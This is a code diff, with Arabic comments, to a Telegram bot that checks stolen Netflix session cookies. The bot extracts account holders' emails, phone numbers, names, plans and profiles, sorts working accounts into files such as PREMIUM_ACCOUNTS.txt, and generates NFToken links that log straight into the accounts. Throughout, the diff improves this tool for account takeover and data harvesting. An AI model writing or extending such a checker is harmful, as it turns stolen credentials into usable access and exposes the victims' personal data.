@@ -225,10 +225,24 @@ def write_text_file_safely(path, content):
     with open(path, "w", encoding="utf-8") as f:
         f.write(content)
 
+def clean_text(text):
+    """تنظيف النصوص من الرموز المشفرة"""
+    if not text:
+        return None
+    text = html.unescape(text)
+    text = text.replace('\\x20', ' ')
+    text = text.replace('\\x40', '@')
+    text = text.replace('\\u00A0', ' ')
+    text = text.replace('&nbsp;', ' ')
+    text = text.replace('\\x2F', '/')
+    text = text.replace('\\"', '"')
+    text = re.sub(r'\\x[0-9a-fA-F]{2}', '', text)
+    return text.strip()
+
 def decode_netflix_value(value):
     if value is None:
         return None
-    return html.unescape(str(value)).strip()
+    return clean_text(str(value))
 
 def extract_first_match(response_text, patterns, flags=0):
     for pattern in patterns:
@@ -252,6 +266,25 @@ def format_boolean_label(value):
     if parsed is False:
         return "No"
     return None
+
+def normalize_phone_number(phone, country_code=None):
+    """تنسيق رقم الهاتف"""
+    if not phone:
+        return None
+    cleaned = re.sub(r'\D', '', str(phone))
+    if not cleaned:
+        return phone
+    
+    # إضافة كود الدولة للأرقام الإندونيسية
+    if country_code == "ID" or country_code == "IN":
+        if cleaned.startswith('0'):
+            cleaned = '62' + cleaned[1:]
+        if not cleaned.startswith('62') and len(cleaned) >= 10:
+            cleaned = '62' + cleaned
+    
+    if len(cleaned) >= 10:
+        return f"+{cleaned}"
+    return cleaned
 
 
 # ==================== COOKIE EXTRACTION FUNCTIONS ====================
@@ -473,8 +506,11 @@ def extract_account_info(growth_account):
     """استخراج بيانات الحساب من growthAccount"""
     info = {}
     
-    # معلومات الحساب الأساسية
-    info['accountOwnerName'] = decode_netflix_value(growth_account.get('ownerName') or growth_account.get('accountOwnerName'))
+    # معلومات الحساب الأساسية (استخدم ownerName بدلاً من accountOwnerName)
+    info['accountOwnerName'] = decode_netflix_value(growth_account.get('ownerName'))
+    if not info['accountOwnerName']:
+        info['accountOwnerName'] = decode_netflix_value(growth_account.get('accountOwnerName'))
+    
     info['email'] = decode_netflix_value(growth_account.get('email'))
     info['countryOfSignup'] = decode_netflix_value(growth_account.get('countryOfSignUp', {}).get('code'))
     info['memberSince'] = decode_netflix_value(growth_account.get('memberSince'))
@@ -502,18 +538,29 @@ def extract_account_info(growth_account):
     
     # رقم الهاتف
     phone = growth_account.get('growthLocalizablePhoneNumber', {})
-    info['phoneNumber'] = decode_netflix_value(phone.get('rawPhoneNumber'))
+    phone_raw = decode_netflix_value(phone.get('rawPhoneNumber'))
+    phone_country = decode_netflix_value(phone.get('countryCode'))
+    info['phoneNumber'] = normalize_phone_number(phone_raw, phone_country)
     info['phoneVerified'] = phone.get('isVerified', False)
     
     # البريد الإلكتروني تم التحقق منه
     email_obj = growth_account.get('growthEmail', {})
     if email_obj:
-        info['email'] = decode_netflix_value(email_obj.get('email', {}).get('value'))
+        email_value = decode_netflix_value(email_obj.get('email', {}).get('value'))
+        if email_value:
+            info['email'] = email_value
         info['emailVerified'] = email_obj.get('isVerified', False)
     
-    # البروفايلات
+    # البروفايلات - استخراج الأسماء الحقيقية
     profiles = growth_account.get('profiles', [])
-    profile_names = [decode_netflix_value(p.get('name')) for p in profiles if p.get('name')]
+    profile_names = []
+    for p in profiles:
+        name = decode_netflix_value(p.get('name'))
+        if name and name.lower() not in ['chrome', 'firefox', 'safari', 'edge', 'opera', 'windows', 'mac', 'linux']:
+            profile_names.append(name)
+    if not profile_names and profiles:
+        profile_names = [decode_netflix_value(p.get('name')) for p in profiles if p.get('name')]
+    
     info['profiles'] = ", ".join(profile_names) if profile_names else None
     info['profileCount'] = len(profile_names)
     
@@ -535,7 +582,9 @@ def extract_profile_names(response_text):
                 name = decode_netflix_value(match.group(1))
                 if name and name not in names and len(name) < 50:
                     names.append(name)
-    return ", ".join(names[:10]) if names else None
+    # تصفية أسماء المتصفحات
+    filtered_names = [n for n in names if n.lower() not in ['chrome', 'firefox', 'safari', 'edge', 'opera', 'windows', 'mac', 'linux']]
+    return ", ".join(filtered_names[:10]) if filtered_names else (", ".join(names[:10]) if names else None)
 
 def has_any_account_info(info):
     if not info:
@@ -544,9 +593,9 @@ def has_any_account_info(info):
     return any(info.get(f) for f in important_fields)
 
 def extract_info_fallback(response_text):
-    """استخراج المعلومات من HTML العادي (عند عدم وجود GraphQL)"""
+    """استخراج المعلومات من HTML العادي"""
     extracted = {
-        "accountOwnerName": extract_first_match(response_text, [r'"name":"([^"]+)"', r'"accountOwnerName":"([^"]+)"', r'"userName":"([^"]+)"']),
+        "accountOwnerName": extract_first_match(response_text, [r'"ownerName":"([^"]+)"', r'"name":"([^"]+)"', r'"accountOwnerName":"([^"]+)"']),
         "email": extract_first_match(response_text, [r'"email":"([^"]+)"', r'"loginId":"([^"]+)"', r'"emailAddress":"([^"]+)"']),
         "countryOfSignup": extract_first_match(response_text, [r'"currentCountry":"([^"]+)"', r'"countryOfSignup":"([^"]+)"', r'"country":"([^"]+)"']),
         "memberSince": extract_first_match(response_text, [r'"memberSince":"([^"]+)"', r'"joinDate":"([^"]+)"']),
@@ -571,6 +620,14 @@ def extract_info(response_text):
     # أولاً: حاول تجيب البيانات من GraphQL
     graphql_info = extract_graphql_data(response_text)
     if graphql_info and has_any_account_info(graphql_info):
+        # تنظيف الإيميل من الرموز المشفرة
+        if graphql_info.get('email'):
+            graphql_info['email'] = clean_text(graphql_info['email'])
+        if graphql_info.get('accountOwnerName'):
+            name = clean_text(graphql_info['accountOwnerName'])
+            # تأكد أن الاسم مش اسم متصفح
+            if name.lower() not in ['chrome', 'firefox', 'safari', 'edge', 'opera']:
+                graphql_info['accountOwnerName'] = name
         return graphql_info
     
     # لو مش موجود، استخدم الطريقة القديمة
@@ -586,7 +643,6 @@ def get_canonical_output_label(plan_key):
     return labels.get(plan_key, "Unknown")
 
 def get_plan_folder_name(plan_key):
-    """جلب اسم مجلد الخطة"""
     folder_names = {
         "premium": "Premium",
         "standard": "Standard",
@@ -635,6 +691,7 @@ def format_display_date(value):
     cleaned = decode_netflix_value(value)
     if not cleaned:
         return "Unknown"
+    cleaned = clean_text(cleaned)
     try:
         if re.match(r"\d{4}-\d{2}-\d{2}", cleaned):
             d = datetime.strptime(cleaned[:10], "%Y-%m-%d")
@@ -647,6 +704,7 @@ def format_member_since(value):
     cleaned = decode_netflix_value(value)
     if not cleaned:
         return "Unknown"
+    cleaned = clean_text(cleaned)
     try:
         if re.match(r"\d{4}-\d{2}-\d{2}", cleaned):
             d = datetime.strptime(cleaned[:10], "%Y-%m-%d")
@@ -746,8 +804,16 @@ def format_result_beautiful(info, is_subscribed, cookie_content, cookie_filename
     status = "Valid Premium Account" if is_subscribed else "Valid Free Account"
     
     name = decode_netflix_value(info.get("accountOwnerName")) or "Unknown"
+    # تأكد أن الاسم مش اسم متصفح
+    if name.lower() in ['chrome', 'firefox', 'safari', 'edge', 'opera']:
+        name = "Unknown"
+    
     email = decode_netflix_value(info.get("email")) or "Unknown"
-    country = format_country_with_flag(info.get("countryOfSignup"))
+    email = clean_text(email)
+    
+    country_raw = decode_netflix_value(info.get("countryOfSignup")) or "Unknown"
+    country = format_country_with_flag(country_raw)
+    
     plan = plan_label
     price = decode_netflix_value(info.get("planPrice")) or "N/A"
     member_since = format_member_since(info.get("memberSince")) or "Unknown"
@@ -763,9 +829,18 @@ def format_result_beautiful(info, is_subscribed, cookie_content, cookie_filename
     email_verified = "Yes" if format_boolean_label(info.get("emailVerified")) == "Yes" else "No"
     membership_status = decode_netflix_value(info.get("membershipStatus")) or "Unknown"
     
-    # Get profiles
+    # Get profiles - استخراج أسماء البروفايلات الحقيقية
     profiles_raw = info.get("profiles") or ""
-    profiles_list = [p.strip() for p in profiles_raw.split(",") if p.strip()]
+    # تنظيف الأسماء من أسماء المتصفحات
+    profiles_list = []
+    for p in profiles_raw.split(","):
+        p_clean = p.strip()
+        if p_clean and p_clean.lower() not in ['chrome', 'firefox', 'safari', 'edge', 'opera']:
+            profiles_list.append(p_clean)
+    
+    if not profiles_list and profiles_raw:
+        profiles_list = [p.strip() for p in profiles_raw.split(",") if p.strip()]
+    
     profiles_count = info.get("profileCount") or len(profiles_list)
     profiles_display = ", ".join(profiles_list[:10]) if profiles_list else "None"
     
@@ -886,14 +961,13 @@ async def bot_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 📌 WHAT I DO:
    ✅ Verify Netflix cookies
-   ✅ Extract full account details (Email, Phone, Payment, Profiles)
-   ✅ Separate accounts by plan (Premium/Standard/Basic/Free)
+   ✅ Extract premium account details
 
 ⚙️ HOW TO USE:
-   1️⃣ Export cookies as JSON from browser
-   2️⃣ Send .txt, .json, or ZIP files
+   1️⃣ Export cookies (.txt or .json)
+   2️⃣ Send files directly (single or ZIP)
    3️⃣ Watch progress bar
-   4️⃣ Receive files organized by plan
+   4️⃣ Receive PREMIUM_ACCOUNTS.txt
 
 🕹️ COMMANDS:
    /start      → Show menu
@@ -911,23 +985,18 @@ async def bot_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
 📖 HELP & INSTRUCTIONS
 
 STEP 1: Export Cookies
-   Use browser extension "Cookie-Editor":
-   - Install from Chrome/Firefox store
-   - Log into Netflix
-   - Click extension icon
-   - Choose "Export" -> "JSON" (NOT Netscape)
+   - EditThisCookie
+   - Cookie-Editor
+   - Get cookies.txt
 
 STEP 2: Send Files
-   - Send single .txt or .json file
+   - Send single .txt or .json
    - OR send ZIP with multiple files
 
 STEP 3: Get Results
-   - Premium_Accounts.txt (Premium accounts)
-   - Standard_Accounts.txt (Standard accounts)
-   - Basic_Accounts.txt (Basic accounts)
-   - Mobile_Accounts.txt (Mobile accounts)
-   - Free_Accounts.txt (Free accounts)
-   - Partial_Data.txt (Limited data)
+   - PREMIUM_ACCOUNTS.txt file
+   - Full account details
+   - NFToken login links
 
 🔽 USE THE MENU BUTTON FOR COMMANDS
 """)
@@ -990,11 +1059,11 @@ async def process_single_bundle(update: Update, context: ContextTypes.DEFAULT_TY
         if mode == 'tokenonly':
             email = info.get("email", "Unknown")
             result = f"Account: {email}\n\nNFToken Login Links:\n---\nPC Login: https://netflix.com/?nftoken={nftoken['token']}\nPhone Login: https://netflix.com/unsupported?nftoken={nftoken['token']}"
+            return result, None, "success" if is_sub else "free"
         else:
             result_lines, plan_key = format_result_beautiful(info, is_sub, bundle.get("netscape_text", ""), cookie_filename, nftoken, config)
             result = "\n".join(result_lines)
-        
-        return result, plan_key, "success" if is_sub else "free"
+            return result, plan_key, "success" if is_sub else "free"
     else:
         partial_info = extract_info_fallback(response_text) if response_text else {}
         if partial_info and has_any_account_info(partial_info):
@@ -1134,8 +1203,6 @@ Speed: {spd:.2f} accounts/second
         await update.message.reply_text(final)
         
         # Send each plan file
-        files_sent = []
-        
         for plan, results in results_by_plan.items():
             if results and plan != "partial":
                 all_results = "".join(results)
@@ -1261,8 +1328,12 @@ async def handle_zip_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
                                         result_lines, plan_key = format_result_beautiful(info, is_sub, bundle.get("netscape_text", ""), cf, nftoken, config)
                                         res = "\n".join(result_lines)
                                     
-                                    results_by_plan[plan_key].append(res)
-                                    results_by_plan[plan_key].append("\n" + "="*65 + "\n")
+                                    if plan_key in results_by_plan:
+                                        results_by_plan[plan_key].append(res)
+                                        results_by_plan[plan_key].append("\n" + "="*65 + "\n")
+                                    else:
+                                        results_by_plan["premium"].append(res)
+                                        results_by_plan["premium"].append("\n" + "="*65 + "\n")
                                     stats['valid'] += 1
                                 else:
                                     result_lines, plan_key = format_result_beautiful(info, is_sub, bundle.get("netscape_text", ""), cf, None, config)
